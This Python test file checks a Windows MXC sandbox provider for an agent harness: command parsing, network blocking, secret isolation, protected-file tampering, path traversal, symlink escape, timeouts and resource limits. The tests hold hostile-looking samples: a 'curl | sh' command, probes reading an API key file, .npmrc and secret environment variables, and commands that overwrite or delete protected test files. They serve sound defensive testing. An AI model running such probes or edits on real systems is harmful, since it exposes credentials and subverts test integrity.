"""[MXC replacement] Tests of the MXC execution provider (evidence_ladder/controller/mxc_sandbox.py, sandbox_provider.py, mxc_dialect/posix_lite.py).
REAL tests (named *_mxc) execute commands in the real Microsoft MXC processcontainer on this host; they are SKIPPED AND LISTED (never counted as passed) when MXC is not available, so a host
without MXC reports NOT_TESTED, never PASS. Tests named *_wsl_parity also need the WSL sandbox. Tests without a suffix are pure logic (no MXC process): dialect parser, factory, fail-closed rules.
No mock stands in for MXC in any *_mxc test. Run from the repo root: python evidence_ladder/controller/tests/phaseMXC_tests.py   (prints {"tests","passed","failed","skipped"}; exit 1 on failure)."""
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import traceback
from pathlib import Path

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(ROOT / "tools"))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from laya_int1_t6 import TASKS                                                              # noqa: E402
from evidence_ladder.controller import mxc_sandbox as M, replay as REP, sandbox_provider as P   # noqa: E402
from evidence_ladder.controller.agentic import AgenticContext, AgenticRun, AgenticTask        # noqa: E402
from evidence_ladder.controller.mxc_dialect import posix_lite as PL                            # noqa: E402
import phaseB_tests as B                                                                    # noqa: E402  helpers: Scorer (LOGIC-ONLY scorer; the controller / sandbox / journal path is the real part)

TESTS, SKIPPED, _CAP = {}, {}, {}


class Skip(Exception):
    pass


def test(f):
    TESTS[f.__name__] = f
    return f


def need_mxc():
    if "c" not in _CAP:
        _CAP["c"] = M.capabilities()
    if not _CAP["c"]["available"]:
        raise Skip("NOT_TESTED: MXC unavailable: %s" % _CAP["c"]["reasons"])


def need_wsl():
    if "w" not in _CAP:
        _CAP["w"] = P.backend_available("wsl")["available"]
    if not _CAP["w"]:
        raise Skip("NOT_TESTED: WSL does not answer")


def raises(exc, fn, *a, **k):
    try:
        fn(*a, **k)
    except exc as e:
        return e
    raise AssertionError("expected %s" % (exc,))


def ws_of(task, extra=None):
    T = TASKS[task]
    d = Path(tempfile.mkdtemp(prefix="mxct-")) / "ws"
    d.mkdir(parents=True)
    for fn, c in T["files"].items():
        (d / fn).write_bytes(c.encode("utf-8"))      # LF on disk (write_text would write CRLF on Windows and make byte-level parity with the WSL sandbox depend on the editor)
    for fn, c in (extra or {}).items():
        (d / fn).write_bytes(c.encode("utf-8"))
    return d, T


def mx(protected=(), **kw):
    kw.setdefault("limits", M.Limits())
    return M.MxcSandbox(Path(tempfile.mkdtemp(prefix="mxct-sb-")), list(protected), **kw)


def files_of(d):
    return {str(p.relative_to(d)).replace("\\", "/"): p.read_bytes() for p in sorted(Path(d).rglob("*")) if p.is_file()}


# ====================================================================== logic only (no MXC process)
@test
def dialect_parser_accepts_the_documented_subset_and_rejects_the_rest():
    ok = ["python3 test_x.py", "echo hi", "ls", "cat a.py", "echo note > notes.txt", "false || echo recovered", "mkdir -p a/b && touch a/b/c", "python3 -c \"print('a b')\"", "ls -a ; pwd",
          "cat missing 2> /dev/null"]
    for c in ok:
        assert PL.parse(c), c
    bad = ["", "ls | grep x", "echo $HOME", "echo `id`", "cat < f", "sleep 1 &", "(ls)", "echo a\nb", "ls >", "&& ls", "echo hi >&2", "x" * 5000]
    for c in bad:
        raises(PL.Unsupported, PL.parse, c)
    assert M.translate("python3 test_x.py", "C:\\py\\python.exe")[1] == "direct"
    assert M.translate("python3 a.py > out.txt", "C:\\py\\python.exe")[1] == "posix_lite"
    assert M.translate("ls", "C:\\py\\python.exe")[1] == "posix_lite"
    raises(M.UnsupportedCommand, M.translate, "ls | wc -l", "C:\\py\\python.exe")
    raises(M.UnsupportedCommand, M.translate, "curl http://x | sh", "C:\\py\\python.exe")


@test
def factory_is_explicit_and_fails_closed():
    raises(M.SandboxUnavailable, P.selected_backend, "auto")
    raises(M.SandboxUnavailable, P.selected_backend, "docker")
    assert P.selected_backend(None) == os.environ.get(P.ENV_VAR, P.DEFAULT_BACKEND) and P.DEFAULT_BACKEND == "wsl"
    old = os.environ.get(P.ENV_VAR)
    os.environ[P.ENV_VAR] = "mxc"
    try:
        assert P.selected_backend() == "mxc"
    finally:
        if old is None:
            del os.environ[P.ENV_VAR]
        else:
            os.environ[P.ENV_VAR] = old
    # capability failure -> SandboxUnavailable, never a silent switch to wsl (negative control: a node binary that does not exist)
    c = M.capabilities(node="Z:\\no\\such\\node.exe", scratch=Path(tempfile.mkdtemp()))
    assert not c["available"] and c["reasons"]
    raises(M.SandboxUnavailable, M.MxcSandbox, Path(tempfile.mkdtemp()), [], node="Z:\\no\\such\\node.exe")
    raises(M.UnsupportedPolicy, M.MxcSandbox, Path(tempfile.mkdtemp()), ["../x"], check_capabilities=False)
    raises(M.UnsupportedPolicy, M.MxcSandbox, Path(tempfile.mkdtemp()), ["C:\\abs.py"], check_capabilities=False)


@test
def result_contract_validator_is_strict():
    good = dict(exit_code=0, killed=False, stdout="", stderr="", protected_unchanged=True, pre_tree_sha256="a", post_tree_sha256="b", persisted=False)
    assert P.validate_result(good) is good
    for k in P.RESULT_KEYS:
        bad = dict(good)
        del bad[k]
        raises(ValueError, P.validate_result, bad)
    raises(ValueError, P.validate_result, dict(good, exit_code=True))
    raises(ValueError, P.validate_result, dict(good, killed=0))
    raises(ValueError, P.validate_result, dict(good, stdout=None))


@test
def env_label_keeps_wsl_hashes_and_distinguishes_mxc():
    class Plain:
        def run(self, *a, **k):
            return {}
    ws, T = ws_of("slug")
    mk = lambda sb: AgenticRun(AgenticTask("slug", T["user"], ws, T["test_cmd"], T["protected"], "sys", 2, None), AgenticContext(sandbox=sb, arm="E"), lambda m: "ctx")   # noqa: E731
    wsl_like, mxc_like = mk(Plain()), mk(type("S", (), {"env_label": M.ENV_LABEL, "run": lambda *a, **k: {}})())
    assert wsl_like.env != mxc_like.env
    from evidence_ladder.common.contract_import import C
    from evidence_ladder.controller.journal import canon
    assert wsl_like.env == "env-" + C.sha256(canon({"sandbox": "wsl-bwrap-systemd", "test_cmd": T["test_cmd"], "protected": T["protected"]}))[:12]      # the pre-MXC formula, byte for byte
    rs = REP.RecordingSandbox(Plain())
    assert rs.env_label == "wsl-bwrap-systemd" and REP.RecordedSandbox([], "x").env_label == "x" and REP.RecordedSandbox([]).env_label == "wsl-bwrap-systemd"


# ====================================================================== contract on the real MXC
@test
def contract_and_hash_parity_mxc():
    need_mxc()
    ws, T = ws_of("clamp")
    with mx(T["protected"]) as sb:
        r = sb.run(ws, T["test_cmd"])
        P.validate_result(r)
        assert r["exit_code"] == 1 and not r["killed"] and r["protected_unchanged"] and not r["persisted"] and r["pre_tree_sha256"] == r["post_tree_sha256"]
        assert "AssertionError" in r["stderr"] and "/work/test_clamp.py" in r["stderr"] and str(ws) not in r["stderr"], r["stderr"]
        r2 = sb.run(ws, T["test_cmd"])
        assert r2 == r                                                                       # deterministic: identical result dict (hashes, output with the per-run directory scrubbed)
        # the tree hash is the WSL helper's algorithm
        import hashlib
        h = hashlib.sha256()
        for p in sorted(x for x in ws.rglob("*") if x.is_file()):
            h.update(str(p.relative_to(ws)).replace("\\", "/").encode() + b"\0" + hashlib.sha256(p.read_bytes()).digest())
        assert r["pre_tree_sha256"] == h.hexdigest()
        assert set(sb.last_diagnostics) >= {"backend", "mxc_call_ms", "prepare_ms", "verify_ms", "total_ms"} and "diagnostics" not in r


@test
def wsl_parity_on_commands_mxc_vs_wsl_parity():
    need_mxc()
    need_wsl()
    diffs = []
    for task in ("slug", "clamp", "wordcount"):
        ws, T = ws_of(task, {"notes_in.txt": "x\n"})
        wsl = P.make_sandbox(Path(tempfile.mkdtemp()), T["protected"], "wsl")
        with mx(T["protected"]) as sb:
            for cmd in [T["test_cmd"], "echo hi", "ls", "cat " + [f for f in T["files"] if not f.startswith("test_")][0], "echo note > notes.txt ; cat notes.txt", "python3 -c \"print(1+1)\"",
                        "false || echo recovered", "nosuchprog", "cat missing.txt", "mkdir -p d && touch d/f && ls d", "python3 -c \"import sys; sys.exit(3)\""]:
                a, b = wsl.run(ws, cmd), sb.run(ws, cmd)
                for k in ("exit_code", "killed", "protected_unchanged", "persisted", "pre_tree_sha256", "post_tree_sha256"):
                    if a[k] != b[k]:
                        diffs.append((task, cmd, k, a[k], b[k]))
                if "AssertionError" not in a["stderr"]:       # python tracebacks carry interpreter-version specific text; everything else must match byte for byte
                    for k in ("stdout", "stderr"):
                        if a[k] != b[k]:
                            diffs.append((task, cmd, k, a[k][:80], b[k][:80]))
                elif a["stdout"] != b["stdout"]:
                    diffs.append((task, cmd, "stdout", a["stdout"][:80], b["stdout"][:80]))
    assert not diffs, diffs


# ====================================================================== isolation / security, real MXC
@test
def secrets_env_and_project_files_unreachable_mxc():
    need_mxc()
    ws, T = ws_of("slug")
    os.environ["LAYA_MXC_TEST_SECRET"] = "s3cret-value"
    try:
        probe = ("import os\n"
                 "print('ENV', sorted(k for k in os.environ if 'SECRET' in k.upper() or 'KEY' in k.upper() or 'TOKEN' in k.upper()))\n"
                 "print('NVALS', len(os.environ))\n"
                 "def rd(p):\n"
                 "    try:\n"
                 "        open(p,'rb').read(10); return 'READ'\n"
                 "    except Exception as e: return type(e).__name__\n"
                 "print('proj', rd(r'" + str(ROOT / "CLAUDE.md") + "'))\n"
                 "print('secrets', rd(r'" + str(ROOT / ".secrets" / "nvidia_api_key_2.txt") + "'))\n"
                 "print('userdir', rd(r'" + str(Path.home() / "Documents" / "desktop.ini") + "'))\n"
                 "print('npmrc', rd(r'" + str(Path.home() / ".npmrc") + "'))\n")
        (ws / "probe.py").write_text(probe, "utf-8")
        native = subprocess.run([sys.executable, str(ws / "probe.py")], capture_output=True, text=True, timeout=60).stdout      # negative control: WITHOUT the sandbox the same probe reads the project file and sees the secret variable
        assert "proj READ" in native and "LAYA_MXC_TEST_SECRET" in native, native
        with mx(T["protected"]) as sb:
            r = sb.run(ws, "python3 probe.py")
    finally:
        del os.environ["LAYA_MXC_TEST_SECRET"]
    out = r["stdout"]
    assert r["exit_code"] == 0, r
    assert "ENV []" in out and "s3cret" not in out and "READ" not in out.replace("NVALS", ""), out
    assert "proj PermissionError" in out and "secrets PermissionError" in out, out


@test
def network_is_blocked_mxc():
    need_mxc()
    ws, T = ws_of("slug")
    (ws / "net.py").write_text("import socket\nfor host in ('1.1.1.1','127.0.0.1'):\n    try:\n        socket.create_connection((host, 80), timeout=3); print(host, 'CONNECTED')\n    except OSError as e:\n        print(host, 'BLOCKED', type(e).__name__)\ntry:\n    print('dns', socket.gethostbyname('example.com'))\nexcept OSError as e:\n    print('dns BLOCKED', type(e).__name__)\n", "utf-8")
    with mx(T["protected"]) as sb:
        r = sb.run(ws, "python3 net.py")
    assert "CONNECTED" not in r["stdout"] and r["stdout"].count("BLOCKED") == 3, r["stdout"]


@test
def protected_files_cannot_be_modified_deleted_or_renamed_mxc():
    need_mxc()
    ws, T = ws_of("clamp")
    before = (ws / "test_clamp.py").read_bytes()
    attacks = ["echo hacked > test_clamp.py", "echo hacked >> test_clamp.py", "rm test_clamp.py", "python3 -c \"import os; os.replace('clamp.py','test_clamp.py')\"",
               "python3 -c \"open('test_clamp.py','w').write('x')\"", "python3 -c \"import os; os.chmod('test_clamp.py', 0o666); open('test_clamp.py','w').write('x')\"",
               "python3 -c \"import os; os.rename('test_clamp.py','t2.py')\""]
    with mx(T["protected"]) as sb:
        for cmd in attacks:
            r = sb.run(ws, cmd, persist=True)
            assert r["protected_unchanged"] is True and r["exit_code"] != 0, (cmd, r)       # the write itself is denied, so the hash comparison also holds
            assert (ws / "test_clamp.py").read_bytes() == before and not (ws / "t2.py").exists(), cmd
            assert r["persisted"] is True              # nothing to refuse: the attack changed nothing
    # negative control: the SAME write on a NON-protected file succeeds and persists
    with mx(T["protected"]) as sb:
        r = sb.run(ws, "echo ok > clamp_note.txt", persist=True)
        assert r["exit_code"] == 0 and r["persisted"] and (ws / "clamp_note.txt").read_text().strip() == "ok"


@test
def path_traversal_absolute_paths_and_escape_writes_blocked_mxc():
    need_mxc()
    ws, T = ws_of("slug")
    outside = ws.parent / "outside_target.txt"
    sib = ws.parent / "sibling"
    sib.mkdir()
    (sib / "keep.txt").write_text("keep")
    probe = ("import os\n"
             "def wr(p):\n"
             "    try:\n"
             "        open(p,'w').write('x'); return 'WROTE'\n"
             "    except Exception as e: return type(e).__name__\n"
             "def rd(p):\n"
             "    try:\n"
             "        open(p).read(); return 'READ'\n"
             "    except Exception as e: return type(e).__name__\n"
             "print('up', wr('../outside_target.txt'))\n"
             "print('abs', wr(r'" + str(outside) + "'))\n"
             "print('c', wr(r'C:\\\\mxc_should_fail.txt'))\n"
             "print('sibling_read', rd(r'" + str(sib / 'keep.txt') + "'))\n"
             "print('sibling_write', wr(r'" + str(sib / 'new.txt') + "'))\n")
    (ws / "probe.py").write_text(probe, "utf-8")
    with mx(T["protected"]) as sb:
        r = sb.run(ws, "python3 probe.py", persist=True)
    assert "WROTE" not in r["stdout"] and "READ" not in r["stdout"], r["stdout"]
    assert not outside.exists() and not (sib / "new.txt").exists() and not Path("C:\\mxc_should_fail.txt").exists()


@test
def symlinks_and_junctions_are_refused_or_not_followed_mxc():
    need_mxc()
    ws, T = ws_of("slug")
    secret = ws.parent / "hostfile.txt"
    secret.write_text("HOST SECRET")
    made = False
    try:
        os.symlink(secret, ws / "link.txt")
        made = True
    except OSError:
        pass
    if not made:                                           # unprivileged Windows may not create symlinks: use a junction (no privilege needed)
        r = subprocess.run(["cmd", "/c", "mklink", "/J", str(ws / "jn"), str(ws.parent)], capture_output=True, text=True)
        made = r.returncode == 0
    if not made:
        raise Skip("NOT_TESTED: this account cannot create a symlink or junction")
    with mx(T["protected"]) as sb:
        e = raises(M.SandboxIntegrityError, sb.run, ws, T["test_cmd"])           # a link in the input workspace is refused before anything is copied
        assert "links" in str(e)
    for p in list(ws.iterdir()):
        if M.is_link(str(p)):
            (os.rmdir if p.is_dir() else os.unlink)(p)
    # a link CREATED by the workload: either the container cannot create one, or persist is refused
    with mx(T["protected"]) as sb:
        r = sb.run(ws, "python3 -c \"import os; os.symlink(r'" + str(secret) + "', 'made_link.txt')\"", persist=True)
    assert not (ws / "made_link.txt").exists() and "HOST SECRET" not in "".join(p.read_text(errors="ignore") for p in ws.iterdir() if p.is_file() and not M.is_link(str(p)))
    assert r["persisted"] is False or r["exit_code"] != 0


@test
def timeout_kills_the_process_tree_and_refuses_persist_mxc():
    need_mxc()
    ws, T = ws_of("slug")
    (ws / "spin.py").write_text("import subprocess, sys, time\nc = subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(120)'])\nprint('CHILD', c.pid, flush=True)\nopen('partial.txt','w').write('x')\ntime.sleep(120)\n", "utf-8")
    with mx(T["protected"]) as sb:
        t0 = time.time()
        r = sb.run(ws, "python3 spin.py", persist=True, timeout=3)
        dt = time.time() - t0
    assert r["killed"] is True and dt < 15, (r, dt)
    assert r["persisted"] is False and not (ws / "partial.txt").exists(), "a killed run must not persist"
    pid = [l.split()[1] for l in r["stdout"].splitlines() if l.startswith("CHILD")]
    if pid:
        time.sleep(1.0)
        out = subprocess.run(["tasklist", "/FI", "PID eq %s" % pid[0], "/NH"], capture_output=True, text=True).stdout
        assert pid[0] not in out, "the container child process survived the timeout: " + out
    # negative control: a normal run in the same sandbox class is not killed
    with mx(T["protected"]) as sb:
        assert sb.run(ws, "python3 -c \"print(1)\"", timeout=30)["killed"] is False


@test
def resource_limits_are_enforced_and_unenforceable_policy_is_rejected_mxc():
    need_mxc()
    ws, T = ws_of("slug")
    (ws / "mem.py").write_text("x=[]\ntry:\n    for i in range(100):\n        x.append(bytearray(50*1024*1024))\n    print('ALLOCATED', 5000)\nexcept MemoryError:\n    print('MemoryError at', len(x)*50)\n", "utf-8")
    (ws / "fork.py").write_text("import subprocess,sys\nps=[]\ntry:\n    for i in range(80):\n        ps.append(subprocess.Popen([sys.executable,'-c','import time;time.sleep(4)']))\n    print('SPAWNED', len(ps))\nexcept OSError as e:\n    print('SPAWN_LIMIT', len(ps))\nfor p in ps: p.kill()\n", "utf-8")
    with mx(T["protected"], limits=M.Limits(memory_mb=300, max_processes=20, cpu_percent=None)) as sb:
        assert sb.limits_enforced
        assert "MemoryError" in sb.run(ws, "python3 mem.py", timeout=60)["stdout"]
        assert "SPAWN_LIMIT" in sb.run(ws, "python3 fork.py", timeout=60)["stdout"]
    # policy that cannot be enforced is rejected (negative control: an impossible Job limit)
    raises(M.UnsupportedPolicy, M.MxcSandbox, Path(tempfile.mkdtemp()), [], limits=M.Limits(memory_mb=-5, max_processes=None, cpu_percent=None), check_capabilities=False)


@test
def cpu_cap_is_enforced_mxc():
    need_mxc()
    ws, T = ws_of("slug")
    (ws / "work.py").write_text("import time\nt=time.process_time()\nn=0\nwhile n<20_000_000: n+=1\nprint(round(time.process_time()-t,2))\n", "utf-8")
    (ws / "par.py").write_text("import subprocess, sys, time\nt=time.time()\nps=[subprocess.Popen([sys.executable,'work.py'],stdout=subprocess.PIPE,text=True) for _ in range(4)]\ncpu=[float(p.communicate()[0]) for p in ps]\nprint(round(time.time()-t,2), round(sum(cpu),2))\n", "utf-8")
    walls = {}
    for label, cap in (("free", None), ("one_core", 100)):
        with mx(T["protected"], limits=M.Limits(memory_mb=2048, max_processes=64, cpu_percent=cap)) as sb:
            r = sb.run(ws, "python3 par.py", timeout=120)
            assert r["exit_code"] == 0, r
            wall, cpu = [float(x) for x in r["stdout"].split()]
            walls[label] = (wall, cpu)
    # the same 4 busy processes take clearly longer wall time under a one-core hard cap (free run is parallel on a multi-core host)
    assert walls["one_core"][0] > 1.8 * walls["free"][0] and walls["one_core"][1] / walls["one_core"][0] < 1.5, walls


@test
def failed_and_malformed_commands_never_look_like_success_mxc():
    need_mxc()
    ws, T = ws_of("slug")
    with mx(T["protected"]) as sb:
        r = sb.run(ws, "nosuchprogram")
        assert r["exit_code"] == 127 and "command not found" in r["stderr"]
        r = sb.run(ws, "python3 -c \"import sys; sys.exit(7)\"")
        assert r["exit_code"] == 7 and not r["killed"]
        r = sb.run(ws, "python3 -c \"raise SystemExit('boom')\"")
        assert r["exit_code"] != 0 and "boom" in r["stderr"]
        for bad in ("ls | wc -l", "echo $HOME", "cat < f", "", "sleep 1 &"):
            raises(M.UnsupportedCommand, sb.run, ws, bad)
        raises(M.SandboxIntegrityError, sb.run, ws / "does_not_exist", "echo hi")


@test
def persistence_and_rollback_semantics_mxc():
    need_mxc()
    ws, T = ws_of("slug")
    before = files_of(ws)
    with mx(T["protected"]) as sb:
        r = sb.run(ws, "echo scratch > scratch.txt", persist=False)
        assert r["exit_code"] == 0 and not r["persisted"] and files_of(ws) == before and r["pre_tree_sha256"] != r["post_tree_sha256"]       # rollback: the workspace is untouched
        r = sb.run(ws, "echo kept > kept.txt ; rm slug.py", persist=True)
        assert r["persisted"] and (ws / "kept.txt").read_text().strip() == "kept" and not (ws / "slug.py").exists()                       # persist applies adds AND deletes
        assert (ws / "test_slug.py").read_bytes() == before["test_slug.py"]
        r = sb.run(ws, "python3 -c \"import sys; open('late.txt','w').write('x'); sys.exit(1)\"", persist=True)
        assert r["exit_code"] == 1 and r["persisted"] is True and (ws / "late.txt").exists()          # same rule as the WSL helper: a failing command still persists when not killed
    # candidates are isolated from one another and from earlier runs
    ws2, T2 = ws_of("slug")
    with mx(T2["protected"]) as sb:
        sb.run(ws2, "echo a > only_in_first_run.txt", persist=False)
        assert "only_in_first_run.txt" not in sb.run(ws2, "ls")["stdout"]
        sb.run(ws2, "python3 -c \"import os; open(os.path.join(os.environ['TEMP'],'t.txt'),'w').write('x')\"")
        r = sb.run(ws2, "python3 -c \"import os; print(os.path.exists(os.path.join(os.environ['TEMP'],'t.txt')))\"")
        assert r["stdout"].strip() == "False", r
    assert not any((sb.scratch / "runs").glob("*")), "run directories must be deleted"


@test
def malformed_bridge_responses_and_a_dead_bridge_are_tool_errors_mxc():
    need_mxc()
    ws, T = ws_of("slug")
    with mx(T["protected"], persistent=True) as sb:
        good = sb.run(ws, "echo ok")
        assert good["stdout"] == "ok\n"
        real_call = sb.bridge.call
        for fake in (None, {"nope": 1}, {"ok": True, "exitCode": "0", "stdout": "", "stderr": ""}, {"ok": True, "exitCode": 0, "stdout": 5, "stderr": ""},
                     {"ok": False, "error": {"code": "backend_error", "message": "x"}}):
            sb.bridge.call = lambda req, timeout, fake=fake: fake
            raises(RuntimeError, sb.run, ws, "echo ok")                      # never a result built from a bad answer, never a pass
        sb.bridge.call = real_call
        sb.bridge.proc.kill()                                                # a dead bridge between calls: restarted on the next call
        sb.bridge.proc.wait(timeout=10)
        assert sb.run(ws, "echo again")["stdout"] == "again\n" and sb.bridge.starts == 2
        assert not any((sb.scratch / "runs").glob("*"))                      # failed runs leave no run directory behind


@test
def background_child_does_not_outlive_a_normal_run_nor_write_after_persist_mxc():
    need_mxc()
    ws, T = ws_of("slug")
    child_src = "import time\ntime.sleep(3)\nopen('late_write.txt','w').write('x')\ntime.sleep(60)\n"
    (ws / "child.py").write_text(child_src, "utf-8")
    (ws / "bg.py").write_text("import subprocess, sys\nc = subprocess.Popen([sys.executable, 'child.py'], creationflags=0x00000008)\nprint('CHILD', c.pid, flush=True)\n", "utf-8")
    with mx(T["protected"], persistent=True) as sb:
        r = sb.run(ws, "python3 bg.py", persist=True)
        assert r["exit_code"] == 0 and r["persisted"]
        pid = [l.split()[1] for l in r["stdout"].splitlines() if l.startswith("CHILD")][0]
        time.sleep(5)
        assert pid not in subprocess.run(["tasklist", "/FI", "PID eq " + pid, "/NH"], capture_output=True, text=True).stdout, "a detached child survived the run"
        assert not (ws / "late_write.txt").exists(), "a background child wrote into the workspace after persist"


@test
def persistent_bridge_does_not_leak_state_between_runs_mxc():
    need_mxc()
    ws, T = ws_of("slug")
    with mx(T["protected"], persistent=True) as sb:
        a = sb.run(ws, "python3 -c \"import os; open('x.txt','w').write('1'); print(os.listdir('.'))\"")
        b = sb.run(ws, "python3 -c \"import os; print(os.listdir('.'))\"")
        assert "x.txt" in a["stdout"] and "x.txt" not in b["stdout"]
        assert sb.bridge.starts == 1 and len(sb.diagnostics_log) == 2


# ====================================================================== the controller on real MXC
def _drive(task, sandbox_factory):
    """Real AgenticRun + RecordedRun: investigate, one step with [read, fix, wrong, test], finish, record. -> (result, record, journal hash)."""
    import el_arch1_variants as V
    T = TASKS[task]
    ws = Path(tempfile.mkdtemp(prefix="mxct-e2e-")) / "ws"
    ws.mkdir(parents=True)
    for fn, c in T["files"].items():
        (ws / fn).write_text(c, "utf-8")
    at = AgenticTask(task, T["user"], ws, T["test_cmd"], T["protected"], "system text", 3, [V.FILE[task]])
    rr = REP.RecordedRun(at, AgenticContext(sandbox=sandbox_factory(T), scorer=B.Scorer(scores=[0.1, 0.2, 0.9, 0.3]), arm="E", config={}), lambda m: "ctx")
    rr.begin()
    rr.investigate()
    rec = rr.step([V.option("Read", file_path=T["protected"][0]), V.fix(task), V.wrong(task), V.bash(T["test_cmd"])], {"new_tokens": 9, "prompt_tokens": 40})
    res = rr.finish()
    return rr, rec, res, ws, T


@test
def controller_three_tasks_verified_with_replay_mxc():
    need_mxc()
    for task in ("slug", "clamp", "wordcount"):
        rr, rec, res, ws, T = _drive(task, lambda T: mx(T["protected"]))
        assert res.answer_label == "VERIFIED" and res.stop_cause == "decided" and rec["chosen_index"] == 1 and rec["trusted_evidence_overrode_laya"] is True, (task, res.answer_label, res.stop_cause, rec.get("chosen_index"))
        assert rr.run.invariants_checked and rr.run.env == "env-" + __import__("evidence_ladder.common.contract_import", fromlist=["C"]).C.sha256(
            __import__("evidence_ladder.controller.journal", fromlist=["canon"]).canon({"sandbox": M.ENV_LABEL, "test_cmd": T["test_cmd"], "protected": T["protected"]}))[:12]
        record = rr.record()
        assert record["sandbox_label"] == M.ENV_LABEL
        off = REP.replay(json.loads(json.dumps(record)))
        assert off["identical"] and off["mode"] == "offline_recorded_sandbox", (task, off)
        live = REP.replay(json.loads(json.dumps(record)), sandbox=mx(T["protected"]))
        assert live["identical"] and live["replayed_journal_hash"] == res.journal_hash, (task, live)
        # evaluation-only data stays inaccessible: the run directory never contained anything but the task files
        assert sorted(p.name for p in ws.iterdir() if p.is_file()) == sorted(T["files"])


@test
def trusted_failing_check_overrides_model_preference_mxc():
    need_mxc()
    import el_arch1_variants as V
    T = TASKS["clamp"]
    ws = Path(tempfile.mkdtemp(prefix="mxct-e2e-")) / "ws"
    ws.mkdir(parents=True)
    for fn, c in T["files"].items():
        (ws / fn).write_text(c, "utf-8")
    at = AgenticTask("clamp", T["user"], ws, T["test_cmd"], T["protected"], "system text", 3, ["clamp.py"])
    run = AgenticRun(at, AgenticContext(sandbox=mx(T["protected"]), scorer=B.Scorer(scores=[0.9, 0.1]), arm="E", config={}), lambda m: "ctx")
    run.begin()
    rec = run.step([V.wrong("clamp"), V.fix("clamp")], {})
    res = run.finish()
    assert rec["chosen_index"] == 1 and res.answer_label == "VERIFIED" and rec.get("trusted_evidence_overrode_laya") is True, rec


def main():
    failed = {}
    for name, f in TESTS.items():
        try:
            f()
        except Skip as s:
            SKIPPED[name] = str(s)
        except (Exception, SystemExit):      # noqa: BLE001
            failed[name] = traceback.format_exc()[-1400:]
    print(json.dumps({"tests": len(TESTS), "passed": len(TESTS) - len(failed) - len(SKIPPED), "failed": failed, "skipped": SKIPPED}, indent=1))
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
